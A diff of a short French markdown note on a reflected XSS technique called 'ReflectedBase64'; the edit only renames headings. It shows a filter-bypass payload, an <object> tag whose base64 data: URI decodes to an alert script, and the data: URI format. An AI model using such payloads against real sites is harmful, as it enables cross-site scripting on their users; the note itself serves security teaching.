@@ -1,11 +1,10 @@
 # Nom de la faille
 ReflectedBase64 
 
-## Exemple de charge utile `data:` URI
-
+## Définition
 On peut contourner certains filtres XSS en utilisant une URI de type `data:` encodée en **base64**.
 
-**Object ou iframe avec URI malveillante :**
+## Détection et Exploitation
 
 ```html
 <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></object>
@@ -17,7 +16,7 @@ Cette charge utile base64 représente :
 <script>alert('XSS')</script>
 ```
 
-## Format général de l’URI `data:`
+Format général de l’URI `data:`
 
 ```
 data:[<type MIME>][;base64],<contenu encodé>
